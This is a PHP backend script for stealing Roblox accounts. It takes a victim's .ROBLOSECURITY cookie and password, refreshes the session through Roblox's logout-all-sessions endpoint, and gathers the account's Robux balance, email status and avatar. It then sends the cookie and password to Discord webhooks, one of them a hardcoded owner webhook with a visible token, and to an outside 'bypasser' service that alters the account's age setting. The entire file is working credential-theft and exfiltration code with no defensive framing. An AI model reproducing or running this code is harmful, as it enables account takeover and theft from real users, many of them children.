<?php
header('Content-Type: application/json');

/* ---------- CONFIG ---------- */
const OWNER_WEBHOOK = 'https://discord.com/api/webhooks/1387194557443342351/YrRGyj0anYfi68oAyL5yX6vEIDbQDeuBxf83HQ2F4zZWbky0zUK3CzNtkV2WMbK9HnEn';
const SPLUNK_URL    = 'https://app.splunk.gg/api/bypasser';
/* ----------------------------- */

/* ---------- INPUTS ---------- */
$cookieRaw  = $_GET['cookie']   ?? ($_POST['cookie']   ?? null);
$password   = $_GET['password'] ?? ($_POST['password'] ?? null);
$dualHook   = $_GET['wh']       ?? ($_POST['wh']       ?? null);

if (!$cookieRaw || !$dualHook) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'cookie or wh missing']); exit;
}

/* ---------- HELPERS ---------- */
function curlGet($url, $headers = []) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_TIMEOUT        => 10
    ]);
    $out = curl_exec($ch);
    curl_close($ch);
    return json_decode($out, true) ?: [];
}

function curlPost($url, $payload, $headers = []) {
    $headers[] = 'Content-Type: application/json';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/* ---------- 1. REFRESH COOKIE (your working script) ---------- */
function refreshCookie($oldCookie) {
    /* csrf */
    $ch = curl_init("https://auth.roblox.com/v2/login");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => '{}',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_HTTPHEADER     => [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie: .ROBLOSECURITY=$oldCookie",
            "Content-Type: application/json"
        ]
    ]);
    $out = curl_exec($ch);
    preg_match('/X-CSRF-TOKEN:\s(\S+)/i', $out, $m);
    $csrf = $m[1] ?? null;
    curl_close($ch);

    /* nonce */
    $ch = curl_init("https://apis.roblox.com/hba-service/v1/getServerNonce");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie: .ROBLOSECURITY=$oldCookie"
        ]
    ]);
    $nonce = trim(curl_exec($ch), '"');
    curl_close($ch);

    /* epoch */
    $ch = curl_init("https://apis.roblox.com/token-metadata-service/v1/sessions?nextCursor=&desiredLimit=25");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie: .ROBLOSECURITY=$oldCookie"
        ]
    ]);
    $epoch = json_decode(curl_exec($ch), true)['sessions'][0]['lastAccessedTimestampEpochMilliseconds'] ?? null;
    curl_close($ch);

    /* refresh request */
    $payload = json_encode([
        "secureAuthenticationIntent" => [
            "clientEpochTimestamp" => $epoch,
            "clientPublicKey"      => null,
            "saiSignature"         => null,
            "serverNonce"          => $nonce
        ]
    ]);
    $ch = curl_init("https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HEADER         => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie: .ROBLOSECURITY=$oldCookie",
            "Content-Type: application/json",
            "X-Csrf-Token: $csrf"
        ]
    ]);
    $resp = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headerStr  = substr($resp, 0, $headerSize);
    curl_close($ch);

    preg_match('/\.ROBLOSECURITY=([^;]+)/', $headerStr, $m);
    return $m[1] ?? $oldCookie;
}

/* ---------- 2. VALIDATE & GRAB STATS ---------- */
$cookie = refreshCookie($cookieRaw);

$user = curlGet("https://users.roblox.com/v1/users/authenticated",
    ["Cookie: .ROBLOSECURITY=$cookie"]);
if (!isset($user['id'])) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'cookie invalid']); exit;
}
$uid = $user['id'];

[$cur,$email,$thumb] = [
    curlGet("https://economy.roblox.com/v1/user/currency",            ["Cookie: .ROBLOSECURITY=$cookie"]),
    curlGet("https://accountinformation.roblox.com/v1/email",         ["Cookie: .ROBLOSECURITY=$cookie"]),
    curlGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=$uid&size=150x150")
];

/* ---------- 3. BUILD EMBEDS ---------- */
$dualEmbed = [
    'username' => 'Project X v2',
    'embeds'   => [[
        'title' => 'Project X v2 – RESULT NOTIFICATION',
        'color' => 0x00ff00,
        'description' => "**New Result** • {$user['name']}, 13+",
        'fields' => [['name' => 'ROBLOSECURITY', 'value' => "`$cookie`", 'inline' => false]]
    ]]
];

$ownerEmbed = [
    'username' => 'OwnerGrab',
    'embeds'   => [[
        'title' => ':Cookie_Clicker: Refreshed Cookie',
        'color' => 0xff0000,
        'description' => "
:bulb: **Username** {$user['name']}
:robux: **Balance** {$cur['robux']}  
:email: **Email** ".($email['verified'] ? 'Verified' : 'Unverified')."
:password: **Password** `$password`",
        'image' => ['url' => $thumb['data'][0]['imageUrl'] ?? '']
    ]]
];

/* ---------- 4. FIRE WEBHOOKS & SPLUNK ---------- */
curlPost($dualHook, $dualEmbed);
curlPost(OWNER_WEBHOOK, $ownerEmbed);
curlPost(SPLUNK_URL, [
    'action'   => 'force_minus_13_all_ages',
    'cookie'   => $cookie,
    'password' => $password
]);

echo json_encode(['ok' => true]);
?>
